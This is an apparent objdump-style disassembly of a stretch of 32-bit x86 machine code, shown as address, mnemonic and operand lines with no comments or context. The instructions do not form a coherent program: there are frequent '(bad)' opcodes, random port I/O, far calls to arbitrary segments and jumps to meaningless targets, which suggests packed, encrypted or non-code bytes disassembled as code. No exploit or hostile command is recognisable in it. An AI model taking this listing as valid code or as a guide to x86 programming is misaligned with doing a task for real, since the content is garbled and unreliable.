  420fe8:	inc    edi
  420fe9:	and    DWORD PTR [ebx+0x169b9906],0x841330be
  420ff3:	pop    edi
  420ff4:	inc    dx
  420ff6:	test   al,0xd2
  420ff8:	js     0x420f91
  420ffa:	jecxz  0x421054
  420ffc:	xchg   BYTE PTR [ecx+ecx*4-0x29],dl
  421000:	into   
  421001:	push   ebp
  421002:	and    eax,0xad9e1e08
  421007:	pop    esp
  421008:	repnz ins BYTE PTR es:[edi],dx
  42100a:	je     0x421059
  42100c:	inc    ebp
  42100d:	pop    esi
  42100e:	or     dh,BYTE PTR [ecx-0x55]
  421011:	and    DWORD PTR [edx+0x7a],ecx
  421014:	fcomp  st(6)
  421016:	call   0xb28962eb
  42101b:	das    
  42101c:	adc    DWORD PTR [edi],eax
  42101e:	and    dh,BYTE PTR [eax+0xc545f16]
  421024:	daa    
  421025:	loop   0x421093
  421027:	add    bh,BYTE PTR [edx]
  421029:	add    eax,0x73d735a2
  42102e:	add    al,0xf7
  421030:	dec    ebx
  421031:	neg    BYTE PTR [edi-0x7e91f4ff]
  421037:	pop    ds
  421038:	mov    edi,0x4b129860
  42103d:	lea    ebx,[eax-0x6b]
  421040:	adc    BYTE PTR [esi+edx*8-0x36],al
  421044:	push   esi
  421045:	add    cl,BYTE PTR [si+0x7a]
  421049:	mov    ds:0x2f06a257,eax
  42104e:	shl    DWORD PTR [eax],cl
  421050:	call   0xbaf:0x3e8f48db
  421057:	pusha  
  421058:	sbb    DWORD PTR [ecx],ecx
  42105a:	rol    DWORD PTR [ebx],cl
  42105c:	fs sbb eax,0x91662a3
  421062:	sbb    DWORD PTR [eax],ecx
  421064:	int3   
  421065:	add    al,0xc7
  421067:	in     al,dx
  421068:	cmc    
  421069:	xor    dl,BYTE PTR [eax+0x31]
  42106c:	dec    edi
  42106d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42106e:	jmp    0xe008:0x25cbb66e
  421075:	fisub  WORD PTR [edx+0x1b]
  421078:	and    al,0xe3
  42107a:	mov    ebx,0x82a26fcb
  42107f:	push   0xffffffa6
  421081:	xchg   edx,eax
  421082:	mov    al,0x2e
  421084:	ins    BYTE PTR es:[edi],dx
  421085:	add    al,0xec
  421087:	retf   0x1ed6
  42108a:	pop    ebp
  42108b:	icebp  
  42108c:	mov    bh,0xcb
  42108e:	clc    
  42108f:	inc    edx
  421090:	mov    ecx,0x43308f09
  421095:	mov    DWORD PTR ds:0xbbe716c8,esp
  42109b:	mov    BYTE PTR [esi+eiz*2],bh
  42109e:	and    BYTE PTR gs:[esi],dh
  4210a1:	es push esi
  4210a3:	(bad)  
  4210a4:	std    
  4210a5:	repz inc esp
  4210a7:	sahf   
  4210a8:	jecxz  0x4210a8
  4210aa:	dec    esi
  4210ab:	add    DWORD PTR [ebx-0x32],eax
  4210ae:	xchg   esi,eax
  4210af:	pop    ds
  4210b0:	pop    ebp
  4210b1:	pop    ecx
  4210b2:	out    0x6d,al
  4210b4:	adc    al,0x80
  4210b6:	cmc    
  4210b7:	jp     0x42108e
  4210b9:	call   DWORD PTR ss:[ecx-0x2227535a]
  4210c0:	sbb    eax,0xbde674f5
	...
  4210d1:	dec    edx
  4210d2:	jo     0x4210ac
  4210d4:	jl     0x4210d0
  4210d6:	cld    
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	push   ss
  4210de:	xor    eax,0x8a8d09e1
  4210e3:	add    DWORD PTR [eax],eax
  4210e5:	lods   al,BYTE PTR ds:[esi]
  4210e6:	add    eax,DWORD PTR [eax]
  4210e8:	add    BYTE PTR [ebx],al
  4210ea:	pop    ecx
  4210eb:	mov    bh,0x8e
  4210ed:	ficom  WORD PTR [edx+0x3b]
  4210f0:	(bad)  
  4210f2:	jnp    0x421109
  4210f4:	cli    
  4210f5:	ret    
  4210f6:	inc    esi
  4210f7:	pop    ecx
  4210f8:	dec    ebx
  4210f9:	fist   DWORD PTR ds:0x8ff2431e
  4210ff:	repnz mov ?,WORD PTR [edi+0x65]
  421103:	adc    eax,0xa29a2bdd
  421108:	xlat   BYTE PTR ds:[ebx]
  421109:	adc    DWORD PTR [ebx-0x1c],0x5a1225e8
  421110:	dec    esi
  421111:	js     0x4210f1
  421113:	add    bh,BYTE PTR [esi-0x79]
  421116:	pushf  
  421117:	jecxz  0x4210b7
  421119:	mov    ds:0xf55590de,al
  42111e:	pop    ss
  42111f:	call   0x652b:0xc3cf4c5a
  421126:	pop    esi
  421127:	fldenv [ebx]
  421129:	clc    
  42112a:	lods   al,BYTE PTR ds:[esi]
  42112b:	stos   DWORD PTR es:[edi],eax
  42112c:	jbe    0x4210fc
  42112e:	mov    ecx,0xd90eeb4c
  421133:	in     eax,dx
  421134:	pop    edx
  421135:	dec    esp
  421136:	test   eax,0xcedd00fd
  42113b:	out    dx,al
  42113c:	test   al,0x55
  42113e:	je     0x42113b
  421140:	push   ds
  421141:	add    BYTE PTR [edi+0x4b374179],bh
  421147:	imul   esi,DWORD PTR [ebx],0x53ccf31b
  42114d:	je     0x42112c
  42114f:	jne    0x4211cd
  421151:	mov    ebp,0x3f8372eb
  421156:	loopne 0x421191
  421158:	popa   
  421159:	pusha  
  42115a:	mov    eax,0x35052fe2
  42115f:	call   0x8bad:0xd57b509f
  421166:	fstp   DWORD PTR ds:0x5dd5d901
  42116c:	mov    al,0x2d
  42116e:	sbb    eax,DWORD PTR [edi+ebx*1-0x7b678c88]
  421175:	jge    0x421198
  421177:	xor    al,0x5e
  421179:	clc    
  42117a:	repz les esp,FWORD PTR [edx+edx*4]
  42117e:	inc    edx
  42117f:	dec    ebx
  421180:	ja     0x42118c
  421182:	push   esp
  421183:	adc    BYTE PTR [esi+0x35],bh
  421186:	pop    esp
  421187:	adc    al,0xf2
  421189:	pop    ebp
  42118a:	test   al,0xd3
  42118c:	mov    es,WORD PTR [ebp+0x3ea90998]
  421192:	sub    edx,DWORD PTR [esi+0x1e]
  421195:	cdq    
  421196:	push   cs
  421197:	xor    bh,BYTE PTR [eax]
  421199:	xchg   ecx,eax
  42119a:	or     BYTE PTR [ebx-0x12],ah
  42119d:	sub    esp,eax
  42119f:	jle    0x4211ed
  4211a1:	cmp    DWORD PTR [edx-0x5f2545bf],edi
  4211a7:	ins    DWORD PTR es:[edi],dx
  4211a8:	adc    edi,DWORD PTR [edi-0x76b47c7a]
  4211ae:	(bad)  
  4211af:	sub    eax,0x61b29894
  4211b4:	jne    0x42116b
  4211b6:	fs popa 
  4211b8:	dec    esp
  4211b9:	rcl    DWORD PTR [edx],cl
  4211bb:	sbb    esi,DWORD PTR [ebp-0x4508279f]
  4211c1:	js     0x421148
  4211c3:	sar    DWORD PTR fs:[edi+0x71a8683f],1
  4211ca:	pop    es
  4211cb:	push   gs
  4211cd:	pop    esp
  4211ce:	stos   DWORD PTR es:[edi],eax
  4211cf:	or     al,0x87
  4211d1:	mov    ebx,0x9d213bfd
  4211d6:	popa   
  4211d7:	dec    ebx
  4211d8:	imul   DWORD PTR [ecx+0x6a]
  4211db:	test   eax,0xa9a13393
  4211e0:	lahf   
  4211e1:	adc    BYTE PTR [eax],0xa4
  4211e4:	lea    edx,[ebx]
  4211e6:	loope  0x42125c
  4211e8:	in     eax,dx
  4211e9:	mov    esi,fs
  4211eb:	inc    ecx
  4211ec:	out    dx,eax
  4211ed:	sub    al,0xb0
  4211ef:	sub    al,0x4
  4211f1:	in     eax,0xfd
  4211f3:	dec    ebp
  4211f4:	and    esi,DWORD PTR [ebx]
  4211f6:	cmp    BYTE PTR [ecx],ah
  4211f8:	mov    ch,BYTE PTR [esi-0x40]
  4211fb:	pop    esi
  4211fc:	sub    dh,bh
  4211fe:	dec    esp
  4211ff:	scas   eax,DWORD PTR es:[edi]
  421200:	das    
  421201:	sub    eax,0xfda4cc39
  421206:	rcl    esp,0xbc
  421209:	adc    bl,ch
  42120b:	out    0xaa,al
  42120d:	push   ecx
  42120e:	push   0xb8e239dd
  421213:	mov    WORD PTR [eax-0xe45b600],es
  421219:	fsubrp st(5),st
  42121b:	push   edx
  42121c:	jnp    0x421243
  42121e:	xor    edx,ecx
  421220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421221:	inc    eax
  421222:	sahf   
  421223:	xor    BYTE PTR ds:0xc31b3551,0x38
  42122a:	xchg   esi,eax
  42122b:	ret    0x2a
  42122e:	xor    BYTE PTR [ebx+0x4e76e1cf],dl
  421234:	fstp   DWORD PTR [edi]
  421236:	cmp    cl,cl
  421238:	and    DWORD PTR [ebx+esi*2-0x1657e955],ebx
  42123f:	jl     0x42124a
  421241:	(bad)  
  421244:	inc    esp
  421245:	fisubr DWORD PTR [ebx+0x4717e607]
  42124b:	mov    cl,0xb8
  42124d:	aam    0xdf
  42124f:	popa   
  421250:	jae    0x421252
  421252:	dec    edx
  421253:	je     0x4211ea
  421255:	mov    dh,0x44
  421257:	xor    BYTE PTR [ebp+0x46],bh
  42125a:	pop    ss
  42125b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42125c:	cmp    esi,edi
  42125e:	mov    ebx,0xcc83a7c2
  421263:	push   ebx
  421264:	out    dx,eax
  421265:	shl    DWORD PTR [ecx-0x74],cl
  421268:	iret   
  421269:	or     al,0x29
  42126b:	inc    ecx
  42126c:	push   edi
  42126d:	mov    WORD PTR [ebx],?
  42126f:	jle    0x42125c
  421271:	add    BYTE PTR [edx],bh
  421273:	sbb    DWORD PTR [edx+0x4d387626],ecx
  421279:	and    DWORD PTR [esi],0x9c27d9a9
  42127f:	sti    
  421280:	imul   esi,ebp,0xffffffba
  421283:	fld    TBYTE PTR ss:[esi-0x63]
  421287:	xchg   ebp,eax
  421288:	sti    
  421289:	or     eax,0xb4650ed7
  42128e:	lahf   
  42128f:	popa   
  421290:	or     eax,0xbc47154e
  421295:	out    0xaa,eax
  421297:	(bad)  
  421298:	fisub  WORD PTR [ecx]
  42129a:	and    eax,0x942a3635
  42129f:	jae    0x4212b4
  4212a1:	out    0x7d,eax
  4212a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212a4:	sub    ebx,DWORD PTR [ebp-0x471baa03]
  4212aa:	lea    edx,[eax+0x683ccd43]
  4212b0:	mov    dh,0xad
  4212b2:	lock jge 0x4212e1
  4212b5:	popa   
  4212b6:	inc    esi
  4212b7:	repz stc 
  4212b9:	jmp    0xce511d4
  4212be:	jbe    0x42128a
  4212c0:	shl    bl,0xdb
  4212c3:	add    BYTE PTR [ecx-0x5d9427d2],ch
  4212c9:	inc    esi
  4212ca:	sbb    DWORD PTR ds:0x611ed5c6,0x56e8a1c
  4212d4:	mov    ebx,0x63f90257
  4212d9:	dec    edx
  4212da:	mov    dl,0xc4
  4212dc:	jl     0x4212a6
  4212de:	clc    
  4212df:	int    0x81
  4212e1:	mov    bh,0x6
  4212e3:	mov    ds:0xb9b14704,al
  4212e8:	lods   al,BYTE PTR ds:[esi]
  4212e9:	adc    eax,0x9d880aad
  4212ee:	xchg   al,bh
  4212f0:	(bad)  
  4212f1:	cmc    
  4212f2:	xor    al,0xbe
  4212f4:	mov    WORD PTR [edx-0x370cba70],cs
  4212fa:	popa   
  4212fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212fc:	lods   al,BYTE PTR ds:[esi]
  4212fd:	cmp    eax,0xe0cd5893
  421302:	data16 clc 
  421304:	inc    edi
  421305:	mov    ebx,edi
  421307:	add    DWORD PTR [edi],eax
  421309:	push   ds
  42130a:	aad    0x8a
  42130c:	dec    ecx
  42130d:	in     eax,0xbd
  42130f:	cmp    cl,BYTE PTR [ebp+0x70]
  421312:	setnp  ah
  421315:	or     BYTE PTR [edx],al
  421317:	pusha  
  421318:	xchg   ecx,eax
  421319:	or     ah,cl
  42131b:	shl    BYTE PTR [ebx+edx*2-0x5b],0x22
  421320:	cdq    
  421321:	and    bl,BYTE PTR [esi+0x46]
  421324:	enter  0x4edf,0x29
  421328:	jns    0x4212b8
  42132a:	cmc    
  42132b:	loop   0x421332
  42132d:	dec    esi
  42132e:	pop    ss
  42132f:	dec    edi
  421330:	add    dh,BYTE PTR ds:0xdd88f39b
  421336:	and    ebx,ecx
  421338:	lds    esi,FWORD PTR [edx+0x6ec431a0]
  42133e:	stos   BYTE PTR es:[edi],al
  42133f:	push   ebp
  421340:	mov    al,ds:0xe112e327
  421345:	pop    ss
  421346:	imul   ecx,esi,0x3
  421349:	sub    ah,dl
  42134b:	repnz and ebp,ebp
  42134e:	rol    DWORD PTR [edi+0xe7f6e0a],0x2e
  421355:	jecxz  0x421345
  421357:	mov    bh,0x87
  42135a:	imul   ebp,ecx,0x17
  42135d:	mov    edx,0xe80649b6
  421362:	shr    BYTE PTR [ebx+0x7ef943d1],cl
  421368:	mov    edi,0x3c44e9dd
  42136d:	cdq    
  42136e:	test   DWORD PTR [edx-0x36],ebx
  421371:	add    bh,BYTE PTR [ecx+0x578523c8]
  421377:	xchg   edx,eax
  421378:	repnz das 
  42137a:	xchg   BYTE PTR [ecx-0x32800fc7],dh
  421380:	test   BYTE PTR cs:[edi-0x43],0x1d
  421385:	js     0x421385
  421387:	jno    0x4213ea
  421389:	add    DWORD PTR [ecx+0x7cdd6c52],esi
  42138f:	xchg   ebp,eax
  421390:	retf   
  421391:	shl    DWORD PTR [ecx],1
  421393:	ja     0x4213bb
  421395:	ins    BYTE PTR es:[edi],dx
  421396:	adc    ebx,DWORD PTR [ecx+0x28289265]
  42139c:	icebp  
  42139d:	mov    es,WORD PTR [edx+0x24]
  4213a0:	sar    BYTE PTR [ecx+0x3fc56d3],1
  4213a6:	lahf   
  4213a7:	pop    ebp
  4213a8:	pop    es
  4213a9:	or     eax,0xc290e4d1
  4213ae:	cdq    
  4213af:	icebp  
  4213b0:	popf   
  4213b1:	dec    BYTE PTR [ecx+ecx*8-0x2233ee0c]
  4213b8:	popf   
  4213b9:	dec    esi
  4213ba:	popf   
  4213bb:	mov    ah,0xf2
  4213bd:	(bad)  
  4213be:	je     0x4213d4
  4213c0:	test   DWORD PTR [eax],esp
  4213c2:	xchg   ebx,eax
  4213c3:	js     0x421412
  4213c5:	mov    ebp,0xc015d92
  4213ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213cb:	scas   eax,DWORD PTR es:[edi]
  4213cc:	xchg   edx,eax
  4213cd:	and    BYTE PTR [edx-0xe],al
  4213d0:	ins    BYTE PTR es:[edi],dx
  4213d1:	push   ebp
  4213d2:	(bad)  
  4213d4:	rcr    ecx,cl
  4213d6:	ret    0xbab5
  4213d9:	push   esp
  4213da:	pushaw 
  4213dc:	cmovno eax,esi
  4213df:	bound  ecx,QWORD PTR [edi+0x5294bace]
  4213e5:	push   ecx
  4213e6:	popf   
  4213e7:	dec    edx
  4213e8:	in     eax,0x93
  4213ea:	leave  
  4213eb:	xchg   ebp,eax
  4213ec:	push   edx
  4213ed:	adc    BYTE PTR [esi+0x38236fd],al
  4213f3:	sti    
  4213f4:	inc    esp
  4213f5:	(bad)  
  4213f6:	(bad)  
  4213f7:	push   ebp
  4213f8:	push   cs
  4213f9:	adc    BYTE PTR [eax],0xfc
  4213fc:	mov    dh,0x94
  4213fe:	mov    ecx,0x944ff67b
  421403:	xchg   ebp,eax
  421404:	scas   al,BYTE PTR es:[edi]
  421405:	jno    0x4213b5
  421407:	out    dx,al
  421408:	or     ecx,DWORD PTR [edi+0x7bac4af0]
  42140e:	and    eax,0xc73433f3
  421413:	sub    eax,0x1f2e965d
  421418:	cli    
  421419:	repz dec ecx
  42141b:	add    eax,0xc78d7374
  421420:	adc    ebp,DWORD PTR [esi-0x38]
  421423:	xchg   ebp,eax
  421424:	loop   0x421483
  421426:	push   0xffffffd6
  421428:	test   al,0x68
  42142a:	add    DWORD PTR [ebp+0x5f6f738b],ebx
  421430:	mov    bh,0x61
  421432:	aam    0x21
  421434:	test   eax,0xfa88ff24
  421439:	sbb    BYTE PTR [ebx+0x11227304],0xc4
  421440:	xlat   BYTE PTR ds:[ebx]
  421441:	mov    edx,0xb049c7ff
  421446:	bound  esi,QWORD PTR [edi-0x2a]
  421449:	push   es
  42144a:	push   cs
  42144b:	ss in  al,dx
  42144d:	cmp    dl,BYTE PTR [esi+0x4a30ccd4]
  421453:	push   cs
  421454:	shr    DWORD PTR [ecx+0x74],0xf9
  421458:	out    0xd3,al
  42145a:	push   ds
  42145b:	xchg   edi,eax
  42145c:	rcl    BYTE PTR [edx+0x79339d33],cl
  421462:	xchg   edx,eax
  421463:	or     esi,0xa5d33dba
  421469:	or     ah,BYTE PTR [edi+0xb]
  42146c:	xchg   ch,cl
  42146e:	aaa    
  42146f:	push   eax
  421470:	xchg   ecx,eax
  421471:	mov    bl,0x5c
  421473:	popf   
  421474:	sub    eax,esp
  421476:	xor    ax,0xecd2
  42147a:	pushf  
  42147b:	mov    ds:0x6ceb7206,eax
  421480:	or     al,0xd8
  421482:	lock adc edx,esi
  421485:	rcr    BYTE PTR [edi+0x190669ce],1
  42148b:	xchg   ebp,eax
  42148c:	jmp    0x421472
  42148e:	call   0xe5b3:0x467fd4bf
	...
  4214a1:	(bad)  
  4214a2:	fld    QWORD PTR [ebx-0x70212c74]
  4214a8:	fstp   QWORD PTR [ebp-0x12d866b0]
  4214ae:	mul    DWORD PTR [esi+0x18e391d]
  4214b4:	add    BYTE PTR [ebx+eax*1-0x58840000],ch
  4214bb:	sbb    DWORD PTR [esi-0x2eb17b29],ecx
  4214c1:	pusha  
  4214c2:	adc    eax,0x317ef61c
  4214c7:	push   eax
  4214c8:	xlat   BYTE PTR ds:[ebx]
  4214c9:	mov    ecx,0x84f01c99
  4214ce:	jno    0x4214dd
  4214d0:	jb     0x4214d9
  4214d2:	out    0xf5,al
  4214d4:	int3   
  4214d5:	fucomi st,st(6)
  4214d7:	or     BYTE PTR [edi+0x48],dl
  4214da:	subps  xmm7,XMMWORD PTR [edi+0x74]
  4214de:	std    
  4214df:	sbb    DWORD PTR [esi+0x2],ecx
  4214e2:	jnp    0x421499
  4214e4:	push   ss
  4214e5:	(bad)  
  4214e6:	clc    
  4214e7:	gs jl  0x42149a
  4214ea:	push   esi
  4214eb:	mov    fs,ecx
  4214ed:	add    ah,BYTE PTR [eax-0x2cfcbab9]
  4214f3:	fisubr DWORD PTR [ebp+0x31]
  4214f6:	add    BYTE PTR [ebp-0x2d],al
  4214f9:	xchg   esp,eax
  4214fa:	ret    0xc679
  4214fd:	pop    ss
  4214fe:	out    dx,eax
  4214ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421500:	cmp    eax,0x146a2d75
  421505:	into   
  421506:	jecxz  0x42148f
  421508:	cmp    DWORD PTR [edi-0x74bc4142],ebx
  42150e:	mov    al,0x81
  421510:	pop    esi
  421511:	mov    al,ds:0x918a4e72
  421516:	add    al,0x2a
  421518:	test   DWORD PTR [ecx+eax*4+0x51976509],ebx
  42151f:	aas    
  421520:	xor    DWORD PTR [edi+0x33],0x2b
  421524:	sub    al,0x8c
  421526:	es xor eax,0x4cc6a5f
  42152c:	pop    esp
  42152d:	jp     0x42151d
  42152f:	jmp    0x32e27e55
  421534:	in     eax,0xba
  421536:	loope  0x421562
  421538:	jb     0x4214f3
  42153a:	mov    edi,0xb1db988f
  42153f:	into   
  421540:	out    dx,al
  421541:	ror    BYTE PTR [edx+0x7d],cl
  421544:	int3   
  421545:	xor    DWORD PTR [edx+ebx*1+0x396ec299],edx
  42154c:	inc    esp
  42154d:	scas   eax,DWORD PTR es:[edi]
  42154e:	add    ebx,0xb0f5e69b
  421554:	or     ah,bh
  421556:	mov    bl,0x53
  421558:	dec    ecx
  421559:	pop    ss
  42155a:	addr16 (bad) 
  42155c:	je     0x4214f1
  42155e:	aad    0xbc
  421560:	bound  edi,QWORD PTR [ebx-0x3c7c113f]
  421566:	daa    
  421567:	(bad)  
  421568:	xor    eax,0x9b951351
  42156d:	mov    es,ebp
  42156f:	sbb    BYTE PTR [eax+0x35],ah
  421572:	jb     0x421514
  421574:	fs push ebp
  421576:	ss aad 0x34
  421579:	sub    al,0xa2
  42157b:	sbb    BYTE PTR [ecx+esi*2+0xb949d67],ah
  421582:	in     eax,0x4d
  421584:	loop   0x42158f
  421586:	inc    ecx
  421587:	aaa    
  421588:	das    
  421589:	mov    bh,0xd6
  42158b:	ror    edx,1
  42158d:	push   0xfd07ac48
  421592:	jecxz  0x4215b3
  421594:	pop    edi
  421595:	push   edi
  421596:	cmp    eax,DWORD PTR [edi]
  421598:	push   esi
  421599:	outs   dx,DWORD PTR ds:[esi]
  42159a:	lahf   
  42159b:	scas   al,BYTE PTR es:[edi]
  42159c:	loopne 0x421597
  42159e:	add    al,0x40
  4215a1:	call   0x6de4:0xaa5cfc51
  4215a8:	xchg   ecx,eax
  4215a9:	xor    ch,ch
  4215ab:	mov    eax,ds:0x43e655c2
  4215b0:	add    eax,DWORD PTR [ebp+0x17e73959]
  4215b6:	adc    al,BYTE PTR [eax-0xc]
  4215b9:	jo     0x421614
  4215bb:	adc    DWORD PTR [ecx+0x54],esi
  4215be:	and    eax,0x71f31ecd
  4215c3:	ficom  WORD PTR [eax+0x4c]
  4215c6:	inc    esi
  4215c7:	sbb    al,0x3f
  4215c9:	call   0x8358:0x1cfe5a46
  4215d0:	push   esp
  4215d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215d2:	lea    esp,[ebx-0x76752791]
  4215d8:	out    dx,al
  4215d9:	xchg   edx,eax
  4215da:	daa    
  4215db:	sub    esi,ebx
  4215dd:	je     0x421613
  4215df:	jne    0x421600
  4215e1:	aas    
  4215e2:	xlat   BYTE PTR ds:[ebx]
  4215e3:	fldenv [eax-0x967007]
  4215e9:	setne  BYTE PTR [ebx+0xe]
  4215ed:	cli    
  4215ee:	sub    DWORD PTR [eax-0x3d],0x5e90ebc6
  4215f5:	cmp    bl,BYTE PTR [eax+0x9]
  4215f8:	leave  
  4215f9:	push   es
  4215fa:	aam    0xe5
  4215fc:	repnz dec DWORD PTR [eax+eax*8-0x15]
  421601:	sub    al,0x7
  421603:	aad    0x4c
  421605:	cmp    eax,0xe0dda926
  42160a:	fld    QWORD PTR [ebp-0x7270e7ab]
  421610:	imul   edx,DWORD PTR ds:0xdfe0746f,0xffffffd3
  421617:	test   eax,0x40d96b61
  42161c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42161d:	mov    ch,0xa3
  42161f:	jo     0x421601
  421621:	test   BYTE PTR [eax],bh
  421623:	sbb    DWORD PTR [esi],esi
  421625:	fs push ebp
  421627:	push   ds
  421628:	xchg   edi,eax
  421629:	cld    
  42162a:	mov    fs,WORD PTR ds:0x13fef1b
  421630:	fcmovu st,st(6)
  421632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421633:	add    dl,ch
  421635:	dec    eax
  421636:	push   ebx
  421637:	out    0x36,eax
  421639:	test   eax,0xa7843093
  42163e:	mov    BYTE PTR [edi-0x6c],cl
  421641:	mov    DWORD PTR [edi],ecx
  421643:	lds    ecx,FWORD PTR [edi-0x59]
  421646:	mov    esp,edi
  421648:	ins    BYTE PTR es:[edi],dx
  421649:	add    ebx,DWORD PTR [edi+0x29]
  42164c:	cdq    
  42164d:	xor    DWORD PTR [esp+ebp*4+0x57],0x78a0495d
  421655:	les    ecx,FWORD PTR [ebx+edx*1-0x4a]
  421659:	pop    es
  42165a:	xchg   esp,eax
  42165b:	je     0x421647
  42165d:	in     eax,dx
  42165e:	or     dh,BYTE PTR [esi-0x8]
  421661:	mov    ebx,0xce32fec9
  421666:	jae    0x421651
  421668:	pop    eax
  421669:	enter  0x4828,0xed
  42166d:	cli    
  42166e:	aaa    
  42166f:	call   0x207c8c68
  421674:	popf   
  421675:	fisub  WORD PTR [edx-0x7e]
  421678:	bound  ebx,QWORD PTR [eax-0x38ef11a3]
  42167e:	ds loope 0x421661
  421681:	fisttp DWORD PTR [ecx+0x41448702]
  421687:	aas    
  421688:	(bad)  
  42168a:	xchg   ebp,eax
  42168b:	test   BYTE PTR [edi],dh
  42168d:	out    0x6c,al
  42168f:	imul   ebx,esp,0xe
  421692:	mov    eax,0xd8550dda
  421697:	shl    BYTE PTR [eax],cl
  421699:	imul   eax,ebx,0xfcb0e3ca
  42169f:	pop    ds
  4216a0:	mov    edi,esi
  4216a2:	stos   DWORD PTR es:[edi],eax
  4216a3:	jmp    0x854d:0x52a1180
  4216aa:	enter  0xc938,0x58
  4216ae:	push   ebp
  4216af:	call   0x2a8:0x78f0db65
  4216b6:	pop    ss
  4216b7:	test   eax,0x107c17bf
  4216bc:	mov    dl,dl
  4216be:	frstor [edx+0x31]
  4216c1:	cmp    BYTE PTR [ecx],ah
  4216c3:	retf   
  4216c4:	lahf   
  4216c5:	aam    0xb1
  4216c7:	popa   
  4216c8:	int3   
  4216c9:	and    eax,0xc01cd170
  4216ce:	enter  0xf99b,0x7
  4216d2:	xchg   ecx,eax
  4216d3:	push   ebp
  4216d4:	pop    ebp
  4216d5:	push   ebp
  4216d6:	scas   eax,DWORD PTR es:[edi]
  4216d7:	mov    ebp,0xf88a580b
  4216dd:	jo     0x4216e8
  4216df:	imul   BYTE PTR [ecx]
  4216e1:	pop    ss
  4216e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216e3:	(bad)  
  4216e4:	push   esi
  4216e5:	sub    ecx,DWORD PTR [edi+ebx*8-0x63ad5507]
  4216ec:	ja     0x4216cc
  4216ee:	mov    ch,0x17
  4216f0:	inc    edx
  4216f1:	mov    esp,0x81134df6
  4216f6:	rcr    DWORD PTR [esi-0x24840673],cl
  4216fc:	dec    ecx
  4216fd:	jecxz  0x4216a1
  4216ff:	inc    esp
  421700:	cmp    al,0x5
  421702:	mov    DWORD PTR [edx-0x6f],edi
  421705:	mov    ah,0x5e
  421707:	cmp    edi,eax
  421709:	dec    ebx
  42170a:	xchg   edx,eax
  42170b:	mov    ah,0xb7
  42170d:	stos   DWORD PTR es:[edi],eax
  42170e:	jmp    0x4216ca
  421710:	add    al,0xd6
  421712:	nop
  421713:	xlat   BYTE PTR ds:[ebx]
  421714:	outs   dx,DWORD PTR ds:[esi]
  421715:	out    dx,eax
  421716:	xchg   esp,eax
  421717:	into   
  421718:	inc    ecx
  421719:	cmp    eax,0x9573c9cc
  42171e:	inc    ecx
  42171f:	or     DWORD PTR [eax+eax*4],ebp
  421722:	(bad)  
  421723:	jle    0x4216de
  421725:	loopne 0x421713
  421727:	mov    bh,cl
  421729:	rcl    DWORD PTR [eax],1
  42172b:	fnstenv [eax]
  42172d:	test   eax,0x8d87566b
  421732:	mov    dh,BYTE PTR [ecx+0xec738e4]
  421738:	mov    bl,0xff
  42173a:	dec    esp
  42173b:	xor    eax,0xa1bb2642
  421740:	ja     0x421747
  421742:	pop    es
  421743:	fwait
  421744:	cmp    eax,0xafa70dd5
  421749:	xchg   ecx,esp
  42174b:	lahf   
  42174c:	cmp    esi,DWORD PTR [ecx+0x2f133be6]
  421752:	int3   
  421753:	daa    
  421754:	xchg   esp,eax
  421755:	push   cs
  421756:	lahf   
  421757:	jmp    0x421778
  421759:	cdq    
  42175a:	(bad)  
  42175b:	ror    eax,1
  42175d:	daa    
  42175e:	or     eax,0xa7fd81ef
  421763:	push   edx
  421764:	xor    dh,0xc8
  421767:	push   0x16d657f5
  42176c:	ds push esi
  42176e:	jnp    0x4217dc
  421770:	(bad)  
  421771:	dec    ebx
  421772:	jno    0x4217a6
  421774:	dec    ebx
  421775:	(bad)
  421778:	mov    ebx,0x1d07e178
  42177d:	and    ebp,DWORD PTR [edi+0x4d]
  421780:	(bad)  
  421781:	jnp    0x4217d2
  421783:	and    bl,ah
  421785:	in     al,dx
  421786:	lea    ebx,[edx+0x3870b6c8]
  42178c:	fs adc edx,eax
  42178f:	scas   eax,DWORD PTR es:[edi]
  421790:	jbe    0x42176e
  421792:	jecxz  0x42180c
  421794:	push   cs
  421795:	stc    
  421796:	dec    esp
  421797:	fsubr  DWORD PTR [ecx+0x1c]
  42179a:	dec    edi
  42179b:	aad    0x9d
  42179d:	mov    cs:0x2f6f6e77,eax
  4217a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217a4:	push   edi
  4217a5:	in     eax,0x6d
  4217a7:	data16 mov ds:0xbaca20d7,al
  4217ad:	or     esp,edx
  4217af:	add    ch,0xd5
  4217b2:	cs gs xor al,0x84
  4217b6:	xlat   BYTE PTR ds:[ebx]
  4217b7:	push   edx
  4217b8:	xchg   ecx,eax
  4217b9:	jno    0x4217fb
  4217bb:	cwde   
  4217bc:	fld    QWORD PTR [eax]
  4217be:	push   esi
  4217bf:	push   ecx
  4217c0:	xor    DWORD PTR [ebx-0x19],ebp
  4217c3:	jno    0x4217c5
  4217c5:	cli    
  4217c6:	cmc    
  4217c7:	push   ebp
  4217c8:	mov    cl,BYTE PTR [ebp-0x3b]
  4217cb:	test   dl,0x9b
  4217ce:	jg     0x42178c
  4217d0:	add    eax,0xac230565
  4217d5:	jbe    0x4217dd
  4217d7:	stc    
  4217d8:	xchg   edx,eax
  4217d9:	add    DWORD PTR [ebp-0x5a377c69],edi
  4217df:	mov    gs,WORD PTR [edi]
  4217e1:	cs out dx,eax
  4217e3:	aaa    
  4217e4:	mov    dh,0xf1
  4217e6:	stc    
  4217e7:	cmc    
  4217e8:	push   esi
  4217e9:	pop    edi
  4217ea:	fisubr DWORD PTR [esi-0x59c62b9e]
  4217f0:	mov    bl,0x3
  4217f2:	sub    eax,0x51cfcec2
  4217f7:	jp     0x4217cf
  4217f9:	inc    esp
  4217fa:	(bad)  
  4217fb:	mov    bh,0xe6
